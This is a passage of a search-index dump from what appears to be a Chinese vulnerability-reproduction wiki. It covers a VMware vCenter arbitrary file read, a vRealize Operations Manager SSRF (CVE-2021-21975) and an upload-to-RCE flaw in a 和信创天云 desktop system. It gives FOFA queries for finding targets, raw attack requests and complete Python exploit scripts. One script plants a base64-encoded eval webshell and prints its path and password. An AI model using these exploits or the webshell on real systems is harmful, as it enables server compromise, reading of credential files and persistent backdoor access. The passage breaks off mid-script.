vCenter\u7279\u5b9a\u7248\u672c\u5b58\u5728\u4efb\u610f\u6587\u4ef6\u8bfb\u53d6\u6f0f\u6d1e\uff0c\u653b\u51fb\u8005\u901a\u8fc7\u6784\u9020\u7279\u5b9a\u7684\u8bf7\u6c42\uff0c\u53ef\u4ee5\u8bfb\u53d6\u670d\u52a1\u5668\u4e0a\u4efb\u610f\u6587\u4ef6\u3001","title":"\u6f0f\u6d1e\u63cf\u8ff0"},{"location":"%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0/%E6%9C%8D%E5%8A%A1%E5%99%A8%E5%BA%94%E7%94%A8%E6%BC%8F%E6%B4%9E/VMware/VMware%20vCenter%E4%BB%BB%E6%84%8F%E6%96%87%E4%BB%B6%E8%AF%BB%E5%8F%96%E6%BC%8F%E6%B4%9E/#\u6f0f\u6d1e\u5f71\u54cd","text":"[!NOTE] VMware vCenter Server 6.5.0a- f \u7248\u672c","title":"\u6f0f\u6d1e\u5f71\u54cd"},{"location":"%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0/%E6%9C%8D%E5%8A%A1%E5%99%A8%E5%BA%94%E7%94%A8%E6%BC%8F%E6%B4%9E/VMware/VMware%20vCenter%E4%BB%BB%E6%84%8F%E6%96%87%E4%BB%B6%E8%AF%BB%E5%8F%96%E6%BC%8F%E6%B4%9E/#fofa","text":"[!NOTE] title=\"ID_VC_Welcome\"","title":"FOFA"},{"location":"%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0/%E6%9C%8D%E5%8A%A1%E5%99%A8%E5%BA%94%E7%94%A8%E6%BC%8F%E6%B4%9E/VMware/VMware%20vCenter%E4%BB%BB%E6%84%8F%E6%96%87%E4%BB%B6%E8%AF%BB%E5%8F%96%E6%BC%8F%E6%B4%9E/#\u6f0f\u6d1e\u590d\u73b0","text":"\u4f7f\u7528POC\u8bbf\u95ee\u6f0f\u6d1e\u70b9 [!NOTE] Windows\u4e3b\u673a http://xxx.xxx.xxx.xxx/eam/vib?id=C:\\ProgramData\\VMware\\vCenterServer\\cfg\\vmware-vpx\\vcdb.properties [!NOTE] Linux\u4e3b\u673a https://xxx.xxx.xxx.xxx/eam/vib?id=/etc/passwd","title":"\u6f0f\u6d1e\u590d\u73b0"},{"location":"%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0/%E6%9C%8D%E5%8A%A1%E5%99%A8%E5%BA%94%E7%94%A8%E6%BC%8F%E6%B4%9E/VMware/VMware%20vCenter%E4%BB%BB%E6%84%8F%E6%96%87%E4%BB%B6%E8%AF%BB%E5%8F%96%E6%BC%8F%E6%B4%9E/#\u6f0f\u6d1e\u5229\u7528poc","text":"import requests import sys import random import re from requests.packages.urllib3.exceptions import InsecureRequestWarning def title (): print ( '+------------------------------------------' ) print ( '+ \\033 [34mPOC_Des: http://wiki.peiqi.tech \\033 [0m' ) print ( '+ \\033 [34mVersion: VMware vCenter\u4efb\u610f\u6587\u4ef6\u8bfb\u53d6\u6f0f\u6d1e \\033 [0m' ) print ( '+ \\033 [36m\u4f7f\u7528\u683c\u5f0f: python3 poc.py \\033 [0m' ) print ( '+ \\033 [36mUrl >>> http://xxx.xxx.xxx.xxx \\033 [0m' ) print ( '+------------------------------------------' ) def POC_1 ( target_url ): vuln_url_windows = target_url + \"/eam/vib?id=C:\\ProgramData\\VMware \\\\ vCenterServer\\cfg \\\\ vmware-vpx \\\\ vcdb.properties\" vuln_url_linux = target_url + \"/eam/vib?id=/etc/passwd\" headers = { \"User-Agent\" : \"Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/86.0.4240.111 Safari/537.36\" , } try : requests . packages . urllib3 . disable_warnings ( InsecureRequestWarning ) response_linux = requests . get ( url = vuln_url_linux , headers = headers , verify = False , timeout = 5 ) response_windows = requests . get ( url = vuln_url_windows , headers = headers , verify = False , timeout = 5 ) if \"password\" in response_windows . text and response_windows . status_code == 200 : print ( \" \\033 [32m[o] \u76ee\u6807 {} \u5b58\u5728\u6f0f\u6d1e ,\u6210\u529f\u8bfb\u53d6 vcdb.properties \\033 [0m\" . format ( target_url )) print ( \" \\033 [32m[o] Windows\u7cfb\u7edf, \u54cd\u5e94\u4e3a: \\n {} \\033 [0m\" . format ( response_windows . text )) elif \"root\" in response_linux . text and response_linux . status_code == 200 : print ( \" \\033 [32m[o] \u76ee\u6807 {} \u5b58\u5728\u6f0f\u6d1e ,\u6210\u529f\u8bfb\u53d6 /etc/passwd \\033 [0m\" . format ( target_url )) print ( \" \\033 [32m[o] Linux\u7cfb\u7edf, \u54cd\u5e94\u4e3a: \\n {} \\033 [0m\" . format ( response_linux . text )) else : print ( \" \\033 [31m[x] \u4e0d\u5b58\u5728\u6f0f\u6d1e \\033 [0m\" ) sys . exit ( 0 ) except Exception as e : print ( \" \\033 [31m[x] \u8bf7\u6c42\u5931\u8d25 \\033 [0m\" , e ) if __name__ == '__main__' : title () target_url = str ( input ( \" \\033 [35mPlease input Attack Url \\n Url >>> \\033 [0m\" )) POC_1 ( target_url )","title":"\u6f0f\u6d1e\u5229\u7528POC"},{"location":"%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0/%E6%9C%8D%E5%8A%A1%E5%99%A8%E5%BA%94%E7%94%A8%E6%BC%8F%E6%B4%9E/VMware/VMware%20vRealize%20Operations%20Manager%20SSRF%E6%BC%8F%E6%B4%9E%20CVE-2021-21975/","text":"VMware vRealize Operations Manager SSRF\u6f0f\u6d1e CVE-2021-21975 \u00b6 \u6f0f\u6d1e\u63cf\u8ff0 \u00b6 vRealize Operations Manager API\u5305\u542b\u670d\u52a1\u5668\u7aef\u8bf7\u6c42\u4f2a\u9020\u3002\u53ef\u4ee5\u901a\u8fc7\u7f51\u7edc\u8bbf\u95eevRealize Operations Manager API\u7684\u6076\u610f\u653b\u51fb\u8005\u53ef\u4ee5\u6267\u884c\u670d\u52a1\u5668\u7aef\u8bf7\u6c42\u4f2a\u9020\u653b\u51fb(SSRF)\uff0c\u4ee5\u7a83\u53d6\u7ba1\u7406\u51ed\u636e\u3002 \u6f0f\u6d1e\u5f71\u54cd \u00b6 [!NOTE] VMware:vRealize_operations_manager: 8.0.0, 8.0.1, 8.3.0, 8.1.0, 8.1.1, 8.2.0, 7.5.0 VMware:cloud_foundation: 4.x 3.x VMware:vRealize_suite_lifecycle_manager: 8.x FOFA \u00b6 [!NOTE] title=\"vRealize Operations Manager\" \u6f0f\u6d1e\u590d\u73b0 \u00b6 \u8bbf\u95ee\u767b\u5f55\u9875\u9762\u5982\u4e0b \u53d1\u9001\u8bf7\u6c42\u5305\u5982\u4e0b POST /casa/nodes/thumbprints HTTP/1.1 Host: xxx.xxx.xxx.xxx Content-Type: application/json;charset=UTF-8 User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/89.0.4389.114 Safari/537.36 Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9 Content-Length: 24 [\"eheeyd.dnslog.cn\"] POST /casa/nodes/thumbprints HTTP/1.1 Host: xxx.xxx.xxx.xxx Content-Type: application/json;charset=UTF-8 User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/89.0.4389.114 Safari/537.36 Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9 Content-Length: 24 [\"127.0.0.1:443/ui\"] \u6f0f\u6d1e\u5229\u7528POC \u00b6 import requests import sys import random import re from requests.packages.urllib3.exceptions import InsecureRequestWarning def title (): print ( '+------------------------------------------' ) print ( '+ \\033 [34mPOC_Des: http://wiki.peiqi.tech \\033 [0m' ) print ( '+ \\033 [34mGithub : https://github.com/PeiQi0 \\033 [0m' ) print ( '+ \\033 [34m\u516c\u4f17\u53f7 : PeiQi\u6587\u5e93 \\033 [0m' ) print ( '+ \\033 [34mVersion: VMware vRealize Operations Manager \\033 [0m' ) print ( '+ \\033 [36m\u4f7f\u7528\u683c\u5f0f: python3 poc.py \\033 [0m' ) print ( '+ \\033 [36mUrl >>> http://xxx.xxx.xxx.xxx \\033 [0m' ) print ( '+ \\033 [36mDnslog >>> xxx.dnslog.com \\033 [0m' ) print ( '+------------------------------------------' ) def POC_1 ( target_url , v ): vuln_url = target_url + \"/casa/nodes/thumbprints\" headers = { \"User-Agent\" : \"Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/86.0.4240.111 Safari/537.36\" , \"Content-Type\" : \"application/json;charset=UTF-8\" } data = '[\" {} \"]' . format ( Dnslog ) try : requests . packages . urllib3 . disable_warnings ( InsecureRequestWarning ) response = requests . post ( url = vuln_url , headers = headers , data = data , verify = False , timeout = 10 ) if response . status_code == 200 : print ( \" \\033 [32m[o] \u76ee\u6807 {} \u53ef\u80fd\u5b58\u5728SSRF\u6f0f\u6d1e,\u8bf7\u68c0\u67e5 Dnslog \u54cd\u5e94 \\033 [0m\" . format ( target_url , vuln_url )) else : print ( \" \\033 [31m[x] \u76ee\u6807 {} \u4e0d\u5b58\u5728\u6f0f\u6d1e \\033 [0m\" . format ( target_url )) except Exception as e : print ( \" \\033 [31m[x] \u76ee\u6807 {} \u8bf7\u6c42\u5931\u8d25 \\033 [0m\" . format ( target_url )) if __name__ == '__main__' : title () target_url = str ( input ( \" \\033 [35mPlease input Attack Url \\n Url >>> \\033 [0m\" )) Dnslog = str ( input ( \" \\033 [35mDnslog >>> \\033 [0m\" )) POC_1 ( target_url , Dnslog ) Goby & POC \u00b6 [!NOTE] \u5df2\u4e0a\u4f20 https://github.com/PeiQi0/PeiQi-WIKI-POC Goby & POC \u76ee\u5f55\u4e2d VMWare Operations vRealize Operations Manager API SSRF CVE-2021-21975","title":"VMware vRealize Operations Manager SSRF\u6f0f\u6d1e CVE-2021-21975"},{"location":"%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0/%E6%9C%8D%E5%8A%A1%E5%99%A8%E5%BA%94%E7%94%A8%E6%BC%8F%E6%B4%9E/VMware/VMware%20vRealize%20Operations%20Manager%20SSRF%E6%BC%8F%E6%B4%9E%20CVE-2021-21975/#vmware-vrealize-operations-manager-ssrf\u6f0f\u6d1e-cve-2021-21975","text":"","title":"VMware vRealize Operations Manager SSRF\u6f0f\u6d1e CVE-2021-21975"},{"location":"%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0/%E6%9C%8D%E5%8A%A1%E5%99%A8%E5%BA%94%E7%94%A8%E6%BC%8F%E6%B4%9E/VMware/VMware%20vRealize%20Operations%20Manager%20SSRF%E6%BC%8F%E6%B4%9E%20CVE-2021-21975/#\u6f0f\u6d1e\u63cf\u8ff0","text":"vRealize Operations Manager API\u5305\u542b\u670d\u52a1\u5668\u7aef\u8bf7\u6c42\u4f2a\u9020\u3002\u53ef\u4ee5\u901a\u8fc7\u7f51\u7edc\u8bbf\u95eevRealize Operations Manager API\u7684\u6076\u610f\u653b\u51fb\u8005\u53ef\u4ee5\u6267\u884c\u670d\u52a1\u5668\u7aef\u8bf7\u6c42\u4f2a\u9020\u653b\u51fb(SSRF)\uff0c\u4ee5\u7a83\u53d6\u7ba1\u7406\u51ed\u636e\u3002","title":"\u6f0f\u6d1e\u63cf\u8ff0"},{"location":"%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0/%E6%9C%8D%E5%8A%A1%E5%99%A8%E5%BA%94%E7%94%A8%E6%BC%8F%E6%B4%9E/VMware/VMware%20vRealize%20Operations%20Manager%20SSRF%E6%BC%8F%E6%B4%9E%20CVE-2021-21975/#\u6f0f\u6d1e\u5f71\u54cd","text":"[!NOTE] VMware:vRealize_operations_manager: 8.0.0, 8.0.1, 8.3.0, 8.1.0, 8.1.1, 8.2.0, 7.5.0 VMware:cloud_foundation: 4.x 3.x VMware:vRealize_suite_lifecycle_manager: 8.x","title":"\u6f0f\u6d1e\u5f71\u54cd"},{"location":"%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0/%E6%9C%8D%E5%8A%A1%E5%99%A8%E5%BA%94%E7%94%A8%E6%BC%8F%E6%B4%9E/VMware/VMware%20vRealize%20Operations%20Manager%20SSRF%E6%BC%8F%E6%B4%9E%20CVE-2021-21975/#fofa","text":"[!NOTE] title=\"vRealize Operations Manager\"","title":"FOFA"},{"location":"%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0/%E6%9C%8D%E5%8A%A1%E5%99%A8%E5%BA%94%E7%94%A8%E6%BC%8F%E6%B4%9E/VMware/VMware%20vRealize%20Operations%20Manager%20SSRF%E6%BC%8F%E6%B4%9E%20CVE-2021-21975/#\u6f0f\u6d1e\u590d\u73b0","text":"\u8bbf\u95ee\u767b\u5f55\u9875\u9762\u5982\u4e0b \u53d1\u9001\u8bf7\u6c42\u5305\u5982\u4e0b POST /casa/nodes/thumbprints HTTP/1.1 Host: xxx.xxx.xxx.xxx Content-Type: application/json;charset=UTF-8 User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/89.0.4389.114 Safari/537.36 Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9 Content-Length: 24 [\"eheeyd.dnslog.cn\"] POST /casa/nodes/thumbprints HTTP/1.1 Host: xxx.xxx.xxx.xxx Content-Type: application/json;charset=UTF-8 User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/89.0.4389.114 Safari/537.36 Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9 Content-Length: 24 [\"127.0.0.1:443/ui\"]","title":"\u6f0f\u6d1e\u590d\u73b0"},{"location":"%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0/%E6%9C%8D%E5%8A%A1%E5%99%A8%E5%BA%94%E7%94%A8%E6%BC%8F%E6%B4%9E/VMware/VMware%20vRealize%20Operations%20Manager%20SSRF%E6%BC%8F%E6%B4%9E%20CVE-2021-21975/#\u6f0f\u6d1e\u5229\u7528poc","text":"import requests import sys import random import re from requests.packages.urllib3.exceptions import InsecureRequestWarning def title (): print ( '+------------------------------------------' ) print ( '+ \\033 [34mPOC_Des: http://wiki.peiqi.tech \\033 [0m' ) print ( '+ \\033 [34mGithub : https://github.com/PeiQi0 \\033 [0m' ) print ( '+ \\033 [34m\u516c\u4f17\u53f7 : PeiQi\u6587\u5e93 \\033 [0m' ) print ( '+ \\033 [34mVersion: VMware vRealize Operations Manager \\033 [0m' ) print ( '+ \\033 [36m\u4f7f\u7528\u683c\u5f0f: python3 poc.py \\033 [0m' ) print ( '+ \\033 [36mUrl >>> http://xxx.xxx.xxx.xxx \\033 [0m' ) print ( '+ \\033 [36mDnslog >>> xxx.dnslog.com \\033 [0m' ) print ( '+------------------------------------------' ) def POC_1 ( target_url , v ): vuln_url = target_url + \"/casa/nodes/thumbprints\" headers = { \"User-Agent\" : \"Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/86.0.4240.111 Safari/537.36\" , \"Content-Type\" : \"application/json;charset=UTF-8\" } data = '[\" {} \"]' . format ( Dnslog ) try : requests . packages . urllib3 . disable_warnings ( InsecureRequestWarning ) response = requests . post ( url = vuln_url , headers = headers , data = data , verify = False , timeout = 10 ) if response . status_code == 200 : print ( \" \\033 [32m[o] \u76ee\u6807 {} \u53ef\u80fd\u5b58\u5728SSRF\u6f0f\u6d1e,\u8bf7\u68c0\u67e5 Dnslog \u54cd\u5e94 \\033 [0m\" . format ( target_url , vuln_url )) else : print ( \" \\033 [31m[x] \u76ee\u6807 {} \u4e0d\u5b58\u5728\u6f0f\u6d1e \\033 [0m\" . format ( target_url )) except Exception as e : print ( \" \\033 [31m[x] \u76ee\u6807 {} \u8bf7\u6c42\u5931\u8d25 \\033 [0m\" . format ( target_url )) if __name__ == '__main__' : title () target_url = str ( input ( \" \\033 [35mPlease input Attack Url \\n Url >>> \\033 [0m\" )) Dnslog = str ( input ( \" \\033 [35mDnslog >>> \\033 [0m\" )) POC_1 ( target_url , Dnslog )","title":"\u6f0f\u6d1e\u5229\u7528POC"},{"location":"%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0/%E6%9C%8D%E5%8A%A1%E5%99%A8%E5%BA%94%E7%94%A8%E6%BC%8F%E6%B4%9E/VMware/VMware%20vRealize%20Operations%20Manager%20SSRF%E6%BC%8F%E6%B4%9E%20CVE-2021-21975/#goby--poc","text":"[!NOTE] \u5df2\u4e0a\u4f20 https://github.com/PeiQi0/PeiQi-WIKI-POC Goby & POC \u76ee\u5f55\u4e2d VMWare Operations vRealize Operations Manager API SSRF CVE-2021-21975","title":"Goby &amp; POC"},{"location":"%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0/%E6%9C%8D%E5%8A%A1%E5%99%A8%E5%BA%94%E7%94%A8%E6%BC%8F%E6%B4%9E/%E5%92%8C%E4%BF%A1%E5%88%9B%E5%A4%A9%E4%BA%91/%E5%92%8C%E4%BF%A1%E5%88%9B%E5%A4%A9%E4%BA%91%E6%A1%8C%E9%9D%A2%E7%B3%BB%E7%BB%9F%20%E8%BF%9C%E7%A8%8B%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C%20RCE%E6%BC%8F%E6%B4%9E/","text":"\u548c\u4fe1\u521b\u5929\u4e91\u684c\u9762\u7cfb\u7edf \u8fdc\u7a0b\u547d\u4ee4\u6267\u884c RCE\u6f0f\u6d1e \u00b6 \u6f0f\u6d1e\u63cf\u8ff0 \u00b6 \u548c\u4fe1\u521b\u5929\u4e91\u684c\u9762\u7cfb\u7edf\u5b58\u5728\u9ed8\u8ba4\u914d\u7f6e\u5bfc\u81f4\u6587\u4ef6\u4e0a\u4f20\u5e76\u53ef\u4ee5\u8fdc\u7a0b\u547d\u4ee4\u6267\u884c \u6f0f\u6d1e\u5f71\u54cd \u00b6 [!NOTE] \u548c\u4fe1\u521b\u5929\u4e91\u684c\u9762\u7cfb\u7edf \u6f0f\u6d1e\u590d\u73b0 \u00b6 \u767b\u5f55\u9875\u9762\u5982\u4e0b \u53d1\u9001\u8bf7\u6c42\u5305\u5982\u4e0b POST /Upload/upload_file.php?l=1 HTTP/1.1 Host: xxx.xxx.xx.xxx User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/87.0.4280.141 Safari/537.36 Accept: image/avif,image/webp,image/apng,image/*,*/*;q=0.8 Accept-Encoding: gzip, deflate Accept-Language: zh-CN,zh;q=0.9,fil;q=0.8 Cookie: think_language=zh-cn; PHPSESSID_NAMED=h9j8utbmv82cb1dcdlav1cgdf6 Connection: close Content-Type: multipart/form-data; boundary=----WebKitFormBoundaryfcKRltGv Content-Length: 182 ------WebKitFormBoundaryfcKRltGv Content-Disposition: form-data; name=\"file\"; filename=\"peiqi.php\" Content-Type: image/avif <?php phpinfo(); ?> ------WebKitFormBoundaryfcKRltGv-- \u8bbf\u95ee http://xxx.xx.xxx.xxx/Upload/1/peiqi.php \u6f0f\u6d1ePOC \u00b6 import requests import sys import random import base64 import re from requests.packages.urllib3.exceptions import InsecureRequestWarning def title (): print ( '+------------------------------------------' ) print ( '+ \\033 [34mPOC_Des: http://wiki.peiqi.tech \\033 [0m' ) print ( '+ \\033 [34mVersion: \u548c\u4fe1\u4e91\u684c\u9762\u4efb\u610f\u6587\u4ef6\u4e0a\u4f20\u6f0f\u6d1e \\033 [0m' ) print ( '+ \\033 [36m\u4f7f\u7528\u683c\u5f0f: python3 poc.py \\033 [0m' ) print ( '+ \\033 [36mUrl >>> http://xxx.xxx.xxx.xxx \\033 [0m' ) print ( '+ \\033 [36mCmd >>> whoami \\033 [0m' ) print ( '+------------------------------------------' ) def POC_1 ( target_url ): vuln_url = target_url + \"/Upload/upload_file.php?l=test\" headers = { \"User-Agent\" : \"Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko)\" , \"Content-Type\" : \"multipart/form-data; boundary=----WebKitFormBoundaryfcKRltGv\" } data = base64 . b64decode ( \"Q29udGVudC1UeXBlOiBtdWx0aXBhcnQvZm9ybS1kYXRhOyBib3VuZGFyeT0tLS0tV2ViS2l0Rm9ybUJvdW5kYXJ5ZmNLUmx0R3YKCi0tLS0tLVdlYktpdEZvcm1Cb3VuZGFyeWZjS1JsdEd2CkNvbnRlbnQtRGlzcG9zaXRpb246IGZvcm0tZGF0YTsgbmFtZT0iZmlsZSI7IGZpbGVuYW1lPSJwZWlxaS5waHAiCkNvbnRlbnQtVHlwZTogaW1hZ2UvYXZpZgoKPD9waHAKQGVycm9yX3JlcG9ydGluZygwKTsKc2Vzc2lvbl9zdGFydCgpOwoJZWNobyAibm9fc2hlbGwiOwogICAgJGtleT0iZWRmNmJkNWNjMDBiYmM3NiI7CgkkX1NFU1NJT05bJ2snXT0ka2V5OwoJJHBvc3Q9ZmlsZV9nZXRfY29udGVudHMoInBocDovL2lucHV0Iik7CglpZighZXh0ZW5zaW9uX2xvYWRlZCgnb3BlbnNzbCcpKQoJewoJCSR0PSJiYXNlNjRfIi4iZGVjb2RlIjsKCQkkcG9zdD0kdCgkcG9zdC4iIik7CgkJCgkJZm9yKCRpPTA7JGk8c3RybGVuKCRwb3N0KTskaSsrKSB7CiAgICAJCQkgJHBvc3RbJGldID0gJHBvc3RbJGldXiRrZXlbJGkrMSYxNV07IAogICAgCQkJfQoJfQoJZWxzZQoJewoJCSRwb3N0PW9wZW5zc2xfZGVjcnlwdCgkcG9zdCwgIkFFUzEyOCIsICRrZXkpOwoJfQogICAgJGFycj1leHBsb2RlKCd8JywkcG9zdCk7CiAgICAkZnVuYz0kYXJyWzBdOwogICAgJHBhcmFtcz0kYXJyWzFdOwoJY2xhc3MgQ3twdWJsaWMgZnVuY3Rpb24gX19pbnZva2UoJHApIHtldmFsKCRwLiIiKTt9fQogICAgQGNhbGxfdXNlcl9mdW5jKG5ldyBDKCksJHBhcmFtcyk7Cj8+CgotLS0tLS1XZWJLaXRGb3JtQm91bmRhcnlmY0tSbHRHdi0t\" ) try : requests . packages . urllib3 . disable_warnings ( InsecureRequestWarning ) response = requests . post ( url = vuln_url , headers = headers , data = data , verify = False , timeout = 5 ) if \"Requst\" in response . text and response . status_code == 200 : webshell_url = target_url + \"/Upload/test/config.php\" response = requests . get ( url = webshell_url , headers = headers , verify = False , timeout = 5 ) if \"shell\" in response . text and response . status_code == 200 : print ( \" \\033 [32m[o] \u76ee\u6807 {} \u5b58\u5728\u6f0f\u6d1e ,\u6210\u529f\u4e0a\u4f20\u51b0\u874e\u6728\u9a6c config.php \\n [o] \u8def\u5f84\u4e3a {} /Upload/test/config.php \\033 [0m\" . format ( target_url , target_url )) print ( \" \\033 [32m[o] \u5bc6\u7801\u4e3a: PeiQi_webshell \\033 [0m\" ) else : print ( \" \\033 [31m[x] \u8bf7\u6c42\u5931\u8d25 \\033 [0m\" ) sys . exit ( 0 ) else : print ( \" \\033 [31m[x] \u4e0a\u4f20\u5931\u8d25 \\033 [0m\" ) except Exception as e : print ( \" \\033 [31m[x] \u8bf7\u6c42\u5931\u8d25 \\033 [0m\" , e ) if __name__ == '__main__' : title () target_url = str ( input ( \" \\033 [35mPlease input Attack Url \\n Url >>> \\033 [0m\" )) POC_1 ( target_url )","title":"\u548c\u4fe1\u521b\u5929\u4e91\u684c\u9762\u7cfb\u7edf \u8fdc\u7a0b\u547d\u4ee4\u6267\u884c RCE\u6f0f\u6d1e"},{"location":"%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0/%E6%9C%8D%E5%8A%A1%E5%99%A8%E5%BA%94%E7%94%A8%E6%BC%8F%E6%B4%9E/%E5%92%8C%E4%BF%A1%E5%88%9B%E5%A4%A9%E4%BA%91/%E5%92%8C%E4%BF%A1%E5%88%9B%E5%A4%A9%E4%BA%91%E6%A1%8C%E9%9D%A2%E7%B3%BB%E7%BB%9F%20%E8%BF%9C%E7%A8%8B%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C%20RCE%E6%BC%8F%E6%B4%9E/#\u548c\u4fe1\u521b\u5929\u4e91\u684c\u9762\u7cfb\u7edf-\u8fdc\u7a0b\u547d\u4ee4\u6267\u884c-rce\u6f0f\u6d1e","text":"","title":"\u548c\u4fe1\u521b\u5929\u4e91\u684c\u9762\u7cfb\u7edf \u8fdc\u7a0b\u547d\u4ee4\u6267\u884c RCE\u6f0f\u6d1e"},{"location":"%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0/%E6%9C%8D%E5%8A%A1%E5%99%A8%E5%BA%94%E7%94%A8%E6%BC%8F%E6%B4%9E/%E5%92%8C%E4%BF%A1%E5%88%9B%E5%A4%A9%E4%BA%91/%E5%92%8C%E4%BF%A1%E5%88%9B%E5%A4%A9%E4%BA%91%E6%A1%8C%E9%9D%A2%E7%B3%BB%E7%BB%9F%20%E8%BF%9C%E7%A8%8B%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C%20RCE%E6%BC%8F%E6%B4%9E/#\u6f0f\u6d1e\u63cf\u8ff0","text":"\u548c\u4fe1\u521b\u5929\u4e91\u684c\u9762\u7cfb\u7edf\u5b58\u5728\u9ed8\u8ba4\u914d\u7f6e\u5bfc\u81f4\u6587\u4ef6\u4e0a\u4f20\u5e76\u53ef\u4ee5\u8fdc\u7a0b\u547d\u4ee4\u6267\u884c","title":"\u6f0f\u6d1e\u63cf\u8ff0"},{"location":"%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0/%E6%9C%8D%E5%8A%A1%E5%99%A8%E5%BA%94%E7%94%A8%E6%BC%8F%E6%B4%9E/%E5%92%8C%E4%BF%A1%E5%88%9B%E5%A4%A9%E4%BA%91/%E5%92%8C%E4%BF%A1%E5%88%9B%E5%A4%A9%E4%BA%91%E6%A1%8C%E9%9D%A2%E7%B3%BB%E7%BB%9F%20%E8%BF%9C%E7%A8%8B%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C%20RCE%E6%BC%8F%E6%B4%9E/#\u6f0f\u6d1e\u5f71\u54cd","text":"[!NOTE] \u548c\u4fe1\u521b\u5929\u4e91\u684c\u9762\u7cfb\u7edf","title":"\u6f0f\u6d1e\u5f71\u54cd"},{"location":"%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0/%E6%9C%8D%E5%8A%A1%E5%99%A8%E5%BA%94%E7%94%A8%E6%BC%8F%E6%B4%9E/%E5%92%8C%E4%BF%A1%E5%88%9B%E5%A4%A9%E4%BA%91/%E5%92%8C%E4%BF%A1%E5%88%9B%E5%A4%A9%E4%BA%91%E6%A1%8C%E9%9D%A2%E7%B3%BB%E7%BB%9F%20%E8%BF%9C%E7%A8%8B%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C%20RCE%E6%BC%8F%E6%B4%9E/#\u6f0f\u6d1e\u590d\u73b0","text":"\u767b\u5f55\u9875\u9762\u5982\u4e0b \u53d1\u9001\u8bf7\u6c42\u5305\u5982\u4e0b POST /Upload/upload_file.php?l=1 HTTP/1.1 Host: xxx.xxx.xx.xxx User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/87.0.4280.141 Safari/537.36 Accept: image/avif,image/webp,image/apng,image/*,*/*;q=0.8 Accept-Encoding: gzip, deflate Accept-Language: zh-CN,zh;q=0.9,fil;q=0.8 Cookie: think_language=zh-cn; PHPSESSID_NAMED=h9j8utbmv82cb1dcdlav1cgdf6 Connection: close Content-Type: multipart/form-data; boundary=----WebKitFormBoundaryfcKRltGv Content-Length: 182 ------WebKitFormBoundaryfcKRltGv Content-Disposition: form-data; name=\"file\"; filename=\"peiqi.php\" Content-Type: image/avif <?php phpinfo(); ?> ------WebKitFormBoundaryfcKRltGv-- \u8bbf\u95ee http://xxx.xx.xxx.xxx/Upload/1/peiqi.php","title":"\u6f0f\u6d1e\u590d\u73b0"},{"location":"%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0/%E6%9C%8D%E5%8A%A1%E5%99%A8%E5%BA%94%E7%94%A8%E6%BC%8F%E6%B4%9E/%E5%92%8C%E4%BF%A1%E5%88%9B%E5%A4%A9%E4%BA%91/%E5%92%8C%E4%BF%A1%E5%88%9B%E5%A4%A9%E4%BA%91%E6%A1%8C%E9%9D%A2%E7%B3%BB%E7%BB%9F%20%E8%BF%9C%E7%A8%8B%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C%20RCE%E6%BC%8F%E6%B4%9E/#\u6f0f\u6d1epoc","text":"import requests import sys import random import base64 import re from requests.packages.urllib3.exceptions import InsecureRequestWarning def title (): print ( '+------------------------------------------' ) print ( '+ \\033 [34mPOC_Des: http://wiki.peiqi.tech \\033 [0m' ) print ( '+ \\033 [34mVersion: \u548c\u4fe1\u4e91\u684c\u9762\u4efb\u610f\u6587\u4ef6\u4e0a\u4f20\u6f0f\u6d1e \\033 [0m' ) print ( '+ \\033 [36m\u4f7f\u7528\u683c\u5f0f: python3 poc.py \\033 [0m' ) print ( '+ \\033 [36mUrl >>> http://xxx.xxx.xxx.xxx \\033 [0m' ) print ( 